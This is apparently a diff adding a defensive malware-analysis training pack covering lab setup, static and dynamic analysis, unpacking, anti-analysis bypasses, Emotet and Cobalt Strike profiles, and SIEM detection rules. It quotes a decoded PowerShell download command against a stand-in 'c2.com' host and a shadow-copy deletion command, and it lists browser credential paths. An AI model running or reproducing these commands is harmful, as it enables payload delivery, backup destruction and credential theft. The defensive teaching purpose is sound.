@@ -1,0 +1,423 @@
+================================================================================
+TITAN AI — TRAINING PACK 032: MALWARE ANALYSIS — STATIC, DYNAMIC, AND ADVANCED
+REVERSE ENGINEERING, OBFUSCATION, UNPACKING, FAMILY PROFILES, DETECTION ENGINEERING
+================================================================================
+
+================================================================================
+PART 1: MALWARE ANALYSIS METHODOLOGY
+================================================================================
+
+--- THE ANALYSIS WORKFLOW ---
+
+SAFE ANALYSIS ENVIRONMENT SETUP:
+  Never analyze malware on your daily machine.
+  Isolated VM: No shared folders, no network bridge to host, snapshots.
+  
+  Recommended setup:
+  Hypervisor: VMware Workstation or VirtualBox.
+  Guest OS: Windows 10 (for Windows malware), Ubuntu (for Linux malware).
+  Network: Host-only or INetSim (simulates internet without real connectivity).
+  Snapshots: Take clean snapshot before analysis. Revert after.
+  
+  INetSim: Fake internet simulator for malware analysis.
+  Provides: Fake DNS (resolves everything), fake HTTP, fake SMTP.
+  Malware connects to C2 → hits INetSim instead → you see what it was trying to do.
+  
+  FlareVM: Windows malware analysis distro (all tools pre-installed).
+  REMnux: Linux malware analysis distro.
+
+THREE LEVELS OF ANALYSIS:
+
+Level 1: BASIC STATIC ANALYSIS (no execution)
+  Examine binary without running it.
+  Time: 15-30 minutes.
+  Goal: File type, imports, strings, indicators, first classification.
+
+Level 2: BASIC DYNAMIC ANALYSIS (execute, observe behavior)
+  Run in sandbox, observe file system/registry/network changes.
+  Time: 30-60 minutes.
+  Goal: C2 addresses, dropped files, persistence mechanism, network traffic.
+
+Level 3: ADVANCED STATIC/DYNAMIC (reverse engineering)
+  Disassemble, decompile, understand logic in detail.
+  Time: Hours to days.
+  Goal: Full understanding of capabilities, custom decryption, C2 protocol.
+
+================================================================================
+PART 2: STATIC ANALYSIS TOOLS AND TECHNIQUES
+================================================================================
+
+--- LEVEL 1: BASIC STATIC ---
+
+FILE IDENTIFICATION:
+  # Never trust file extension. Identify by magic bytes.
+  file malware.exe
+  # Output: PE32 executable (GUI) Intel 80386, for MS Windows
+  
+  file suspicious.pdf
+  # Output: PDF document, version 1.4  (or: PE32 executable — disguised as PDF)
+  
+  # Magic bytes for common formats:
+  PE (Windows executable): 4D 5A ("MZ") at offset 0
+  ELF (Linux executable):  7F 45 4C 46 ("\x7fELF") at offset 0
+  ZIP/DOCX/XLSX:           50 4B 03 04 ("PK..") at offset 0
+  PDF:                     25 50 44 46 ("%PDF") at offset 0
+
+FILE HASHING:
+  sha256sum malware.exe > hash.txt
+  # Search hash on VirusTotal:
+  curl "https://www.virustotal.com/api/v3/files/$(sha256sum malware.exe | cut -d' ' -f1)" \
+    -H "x-apikey: YOUR_KEY"
+  
+  # Check multiple threat intel platforms:
+  # VirusTotal, Hybrid Analysis, Any.run, Triage, MalwareBazaar
+
+STRING EXTRACTION:
+  strings malware.exe                    # Printable ASCII strings (min 4 chars)
+  strings -e l malware.exe               # UTF-16LE strings (Windows Unicode)
+  strings -n 8 malware.exe              # Minimum 8 chars (reduce noise)
+  
+  # Interesting strings to look for:
+  strings malware.exe | grep -E "(http|ftp|https)://"           # C2 URLs
+  strings malware.exe | grep -E "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+"  # IP addresses
+  strings malware.exe | grep -Ei "(cmd|powershell|wscript|cscript|regsvr32)"  # LOLBINs
+  strings malware.exe | grep -Ei "(CreateFile|WriteFile|OpenProcess|VirtualAlloc)"  # Windows API
+  strings malware.exe | grep -Ei "(password|credential|keylog)"  # Capabilities
+  strings malware.exe | grep -E "[A-Za-z0-9+/]{40,}={0,2}"      # Base64 encoded data
+
+IMPORTS ANALYSIS:
+  # With dumpbin (Windows) or objdump (Linux):
+  dumpbin /imports malware.exe
+  
+  # Python with pefile:
+  import pefile
+  pe = pefile.PE('malware.exe')
+  
+  for entry in pe.DIRECTORY_ENTRY_IMPORT:
+      print(f"DLL: {entry.dll.decode()}")
+      for imp in entry.imports:
+          print(f"  {imp.name.decode() if imp.name else 'ordinal'}")
+  
+  HIGH-RISK IMPORTS TO FLAG:
+  CreateRemoteThread    → Process injection
+  VirtualAllocEx        → Allocate memory in another process (injection)
+  WriteProcessMemory    → Write to another process memory (injection)
+  SetWindowsHookEx      → Keyboard/mouse hook (keylogger, global hooks)
+  OpenProcess           → Access another process
+  RegSetValueEx         → Write to registry (persistence)
+  CreateService         → Create service (persistence)
+  WinExec, ShellExecute → Execute files
+  CryptEncrypt          → Encryption (may encrypt files for ransomware)
+  InternetOpenUrl       → HTTP C2 communication
+  WSAConnect, connect   → Network activity
+
+SECTIONS ANALYSIS:
+  Normal PE sections: .text (code), .data (data), .rdata (read-only), .rsrc (resources)
+  
+  Suspicious sections:
+  .text section with high entropy → packed/encrypted code
+  Unknown section names: UPX0, UPX1 (UPX packer), .pec (PECompact), or random names
+  Sections with read+write+execute flags → self-modifying code
+  
+  import pefile, math
+  
+  def calculate_entropy(data):
+      if not data: return 0
+      entropy = 0
+      for x in set(data):
+          p_x = data.count(x) / len(data)
+          entropy -= p_x * math.log2(p_x)
+      return entropy
+  
+  pe = pefile.PE('malware.exe')
+  for section in pe.sections:
+      name = section.Name.decode().rstrip('\x00')
+      entropy = calculate_entropy(section.get_data())
+      print(f"{name}: entropy={entropy:.2f}, size={section.SizeOfRawData}")
+  
+  # Entropy > 7.0: Encrypted or compressed data (packed malware)
+  # Normal executable: .text entropy ~6.0, .data ~4.0-5.0
+
+--- LEVEL 3: ADVANCED STATIC (REVERSE ENGINEERING) ---
+
+GHIDRA WORKFLOW:
+  1. Import binary: File → New Project → Import File
+  2. Auto-analysis: Run all analyzers (15-30 minutes for large binary)
+  3. Entry point: Window → Symbol Table → Find "main" or "WinMain" or "entry"
+  4. Function graph: See control flow. Color suspicious blocks.
+  5. Decompiler: View C-like pseudocode. Much faster than reading assembly.
+  6. Rename: Give meaningful names to identified functions.
+  7. Comments: Document what each function does.
+  
+  Key Ghidra features for malware:
+  - Search for strings and cross-reference to code that uses them
+  - Find encrypted blobs → trace decryption routine
+  - Symbol table → look for suspicious function names or imports
+
+IDENTIFYING CRYPTO IN MALWARE:
+  Malware frequently encrypts strings, config, C2 traffic.
+  
+  RC4 identification: Look for 256-byte array initialization (S-box), two nested loops.
+  XOR "encryption": Look for XOR instruction in loop. Common but weak.
+  Custom: Look for lookup table operations, bit manipulation, constants.
+  
+  # Known crypto constants (AES S-box first bytes):
+  AES: 0x63, 0x7c, 0x77, 0x7b  (SubBytes lookup table)
+  MD5: 0xd76aa478  (initialization constants)
+  SHA-1: 0x67452301 (h0 initial value)
+  
+  Find crypto: Look for these constants in binary. 
+  If present: Identify which function uses them → understand encryption routine.
+  
+  findcrypt (IDA/Ghidra plugin): Automatically finds crypto constants. Huge time saver.
+
+================================================================================
+PART 3: DYNAMIC ANALYSIS
+================================================================================
+
+--- SANDBOX ANALYSIS ---
+
+AUTOMATED SANDBOXES:
+  Online (submit, wait for report):
+  ANY.RUN: Interactive sandbox. Can interact with malware live.
+  Cuckoo Sandbox: Open-source. Self-hosted.
+  Hybrid Analysis: Free tier with good coverage.
+  Triage (Hatching): Fast, detailed reports.
+  Joe Sandbox: Commercial, comprehensive.
+  
+  What sandboxes capture:
+  - File system changes: Created, modified, deleted files
+  - Registry changes: Persistence keys, configuration storage
+  - Network activity: DNS queries, HTTP requests, TCP connections
+  - Process activity: Child processes, injected processes
+  - API calls: Windows API calls with arguments and return values
+  - Screenshots: What the malware displayed
+  - Memory dumps: At key moments
+
+MANUAL DYNAMIC ANALYSIS TOOLS:
+
+Process Monitor (Sysinternals):
+  Captures: Every file, registry, network, process operation.
+  Filter: Process name = malware.exe. See exactly what it touches.
+  
+  Key filters:
+  Operation = RegSetValue → Registry writes (persistence)
+  Operation = CreateFile AND Path contains Startup → Startup folder persistence
+  Operation = WriteFile AND Path contains AppData → Dropping files
+
+Process Explorer (Sysinternals):
+  Real-time process tree. Show: DLLs loaded, network connections, strings in memory.
+  Highlight: New processes (red/green). Processes that died (gray).
+  Right-click suspicious process → Check VirusTotal → Hash lookup automatically.
+
+Wireshark during execution:
+  Filter: ip.addr == VM_IP or dns
+  Capture: C2 URLs, DNS queries for C2 domains, exfiltration traffic.
+  HTTP traffic: Host header reveals C2 domain. URI path reveals malware family pattern.
+
+Regshot (before/after registry snapshot):
+  1st shot: Before malware execution
+  Run malware
+  2nd shot: After execution
+  Compare: All registry changes. Identify persistence, configuration, hijacking.
+
+--- BEHAVIORAL INDICATORS BY MALWARE TYPE ---
+
+RANSOMWARE BEHAVIORAL SIGNATURES:
+  1. Volume Shadow Copy deletion: vssadmin.exe delete shadows /all /quiet
+     Detection: Child process of ransomware is vssadmin with "delete" argument.
+  
+  2. Rapid file modification: Thousands of file writes in seconds.
+     Detection: FileWrite rate > 100/second sustained for > 5 seconds.
+  
+  3. New file extension: Files renamed to .locked, .encrypted, .WNCRY, etc.
+     Detection: FileRename with new random extension at high volume.
+  
+  4. Encrypted file header: First bytes of modified files: random (encrypted) not recognizable.
+  
+  5. Ransom note dropped: README.txt, DECRYPT.txt, HOW_TO_DECRYPT.html.
+  
+  6. Network: Contact with .onion address or unusual IP for decryption key delivery.
+  
+  7. Privilege escalation: UAC bypass to run as admin for full filesystem access.
+
+TROJAN/RAT BEHAVIORAL SIGNATURES:
+  1. Process injection: ReadProcessMemory + WriteProcessMemory + CreateRemoteThread into common process (explorer.exe, svchost.exe).
+  
+  2. Persistence: Registry Run key, scheduled task, service creation, startup folder.
+  
+  3. C2 beaconing: Regular HTTP/HTTPS to same domain at fixed intervals.
+  
+  4. Screen capture: GDI calls, BitBlt to capture screen.
+  
+  5. Keylogging: SetWindowsHookEx with WH_KEYBOARD_LL hook type.
+  
+  6. Data collection: Access to credential stores (LSASS memory, browser password files).
+
+STEALER BEHAVIORAL SIGNATURES:
+  1. Access browser databases: Chrome's Login Data, Cookies (SQLite files).
+  2. Access saved passwords: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
+  3. Access crypto wallets: AppData paths for Electrum, MetaMask, Exodus.
+  4. Access email clients: Outlook OST/PST files, Thunderbird profiles.
+  5. Archive collection: ZIP/RAR creation with collected data.
+  6. Exfiltration: Single HTTP POST with large body to C2.
+
+================================================================================
+PART 4: OBFUSCATION AND UNPACKING
+================================================================================
+
+--- COMMON PACKING TECHNIQUES ---
+
+UPX (Universal Packer for eXecutables):
+  Compresses PE file. Decompress stub runs first, decompresses real code, jumps to OEP.
+  
+  Identification: Section names UPX0, UPX1 or high entropy .text section.
+  
+  Unpack (trivial for UPX): 
+  upx -d malware_upx.exe  # Decompress if headers not stripped
+  
+  If headers stripped: Run sample, let UPX stub decompress into memory, dump process memory.
+  Tools: PE-bear, OllyDump, x64dbg with ScyllaHide plugin.
+
+CUSTOM PACKERS:
+  Packer: Encrypts code. Loader stub: Decrypts at runtime, jumps to real code.
+  More sophisticated: Anti-analysis, anti-debugging, multi-stage loaders.
+  
+  Finding OEP (Original Entry Point):
+  1. Set breakpoint on VirtualAlloc (stub allocates space for decrypted code)
+  2. Let allocation happen
+  3. Set hardware breakpoint on execute for allocated memory region
+  4. When execution reaches allocated region: You're at OEP
+  5. Dump process memory with reconstructed PE headers
+
+SHELLCODE LOADERS:
+  Shellcode: Position-independent code with no PE structure.
+  Loader: Allocates RWX memory, writes shellcode, calls it.
+  
+  Common pattern:
+  1. Shellcode stored as: Encrypted bytes in .data, base64 string, resource section.
+  2. Loader: Decrypts → VirtualAlloc(RWX) → memcpy → CreateThread(shellcode_addr).
+  
+  Analysis:
+  Find decrypt routine → manually decrypt shellcode → analyze shellcode separately.
+  Or: Let loader run, dump allocated shellcode memory, analyze dump.
+
+--- ANTI-ANALYSIS TECHNIQUES ---
+
+ANTI-DEBUGGING:
+
+IsDebuggerPresent() check:
+  If debugger attached: Exit or different behavior.
+  Bypass: Patch the call to return 0. Or: ScyllaHide plugin patches all checks automatically.
+
+TLS callbacks:
+  Thread Local Storage callbacks run before main().
+  Anti-debug checks in TLS: Run before you see execution start in debugger.
+  Must: Set breakpoint on TLS callback, not just entry point.
+
+Timing checks:
+  RDTSC: CPU clock cycles between instructions.
+  Debugger: Single-stepping is slow. Real execution: Fast.
+  If time between two RDTSCs > threshold: Debugger detected.
+  Bypass: Patch the comparison. ScyllaHide handles RDTSC.
+
+ANTI-VM:
+  CPUID check: VMware/VirtualBox expose specific CPUID signatures.
+  Registry check: Look for VMware registry keys, VirtualBox additions.
+  File check: VMware tools DLLs, VBoxGuest.sys.
+  Process check: vmtoolsd.exe, VBoxTray.exe running?
+  
+  Bypass: Configure VM to not expose VM-specific info.
+  VMware: Advanced settings to hide VM identity.
+  Or: Use bare metal for final analysis of heavily evasive samples.
+
+STRING OBFUSCATION:
+  Rather than readable strings in binary: XOR encode, stack strings, RC4 encrypt.
+  
+  Stack strings: Push individual characters onto stack, reconstruct string.
+  # Assembly:
+  mov byte ptr [rbp-0x10], 0x63  ; 'c'
+  mov byte ptr [rbp-0x0f], 0x6d  ; 'm'
+  mov byte ptr [rbp-0x0e], 0x64  ; 'd'
+  # Result: "cmd" built on stack at runtime — not visible in strings output
+  
+  FLOSS (FireEye Labs Obfuscated String Solver): Finds stack strings automatically.
+  floss malware.exe  # Identifies and extracts stack strings, XOR decoded strings
+
+================================================================================
+PART 5: MALWARE FAMILY DEEP DIVES
+================================================================================
+
+--- EMOTET TECHNICAL PROFILE ---
+
+EMOTET: Banking trojan turned malware delivery platform. Most prevalent malware 2020-2021.
+  Takedown: Europol operation January 2021. Resurrected November 2021.
+  
+  DELIVERY:
+  Phishing email with Word/Excel attachment.
+  Document contains: Macro that downloads Emotet payload.
+  Or: Password-protected ZIP → inside: Document with macro.
+  
+  MACRO BEHAVIOR:
+  WScript/PowerShell download from C2 URL.
+  Typical command: 
+  powershell.exe -nop -w hidden -e [base64_encoded_download_command]
+  Decoded: (New-Object Net.WebClient).DownloadFile('http://c2.com/payload', '%TEMP%\payload.exe')
+  
+  EMOTET PAYLOAD:
+  DLL packed with custom packer. High entropy sections.
+  C2 communication: HTTP to list of hardcoded IPs (not domains — harder to block).
+  Communication: RSA-encrypted request, RC4-encrypted response.
+  
+  PERSISTENCE: Scheduled task or Run registry key.
+  
+  LATERAL MOVEMENT: SMB spreading, credential theft, drops TrickBot/QakBot/Cobalt Strike.
+  
+  DETECTION SIGNATURES:
+  PowerShell with -e flag AND -nop AND -w hidden from Office process:
+  ParentProcess=WINWORD.EXE AND CommandLine contains "-e" AND "-nop" AND "-w hidden"
+
+--- COBALT STRIKE (THREAT ACTOR USE) ---
+
+Original: Commercial red team tool. Cracked versions used by ransomware gangs.
+  
+  STAGER vs STAGELESS:
+  Stager: Small shellcode that downloads full beacon.
+    Delivery: Smaller payload. C2 needed to complete loading.
+  Stageless: Full beacon included. No C2 needed to load.
+  
+  BEACON CHARACTERISTICS:
+  Named pipe communication (SMB beacon): Internal lateral movement.
+  HTTPS communication: External C2.
+  Default port 443 with self-signed cert: Detectable.
+  Malleable C2: Customized profiles look like legitimate traffic.
+  
+  DEFAULT COBALT STRIKE IOCs (detect cracked/misconfigured):
+  Self-signed cert with specific subject: O=cobaltstrike, OU=AdvancedThreatResearch
+  HTTP server header: X-Forwarded-For or specific response patterns.
+  Default beacon sleep = 60s, jitter = 0.
+  Specific JARM fingerprint (TLS fingerprint of default CS server).
+  
+  MEMORY INDICATORS:
+  Beacon in memory: MZ header NOT backed by file on disk (classic malfind hit).
+  ReflectiveDLL loading: PE not mapped from file, in anonymous region.
+  
+  HUNTING IN SIEM:
+  process creation WHERE
+    parent = (mshta.exe, wscript.exe, powershell.exe)
+    AND child_name ∈ (cmd.exe, powershell.exe, rundll32.exe)
+    AND timeOfDay ∈ (02:00-06:00)
+  
+  → Malware often runs initial actions at night to avoid detection.
+
+================================================================================
+END OF PACK 032: MALWARE ANALYSIS
+Total: Safe analysis environment setup (FlareVM/REMnux, INetSim), 3-level analysis
+framework, basic static (file ID magic bytes, strings, imports analysis, PE sections
+entropy), advanced static (Ghidra workflow, crypto constant identification),
+dynamic analysis (sandbox platforms, Process Monitor/Explorer/Regshot), behavioral
+signatures by malware type (ransomware/RAT/stealer), obfuscation (UPX unpacking,
+custom packers, OEP finding), anti-analysis techniques (anti-debug/VM/strings with
+bypasses), FLOSS, Emotet technical profile, Cobalt Strike memory indicators and
+SIEM hunting rules.
+================================================================================
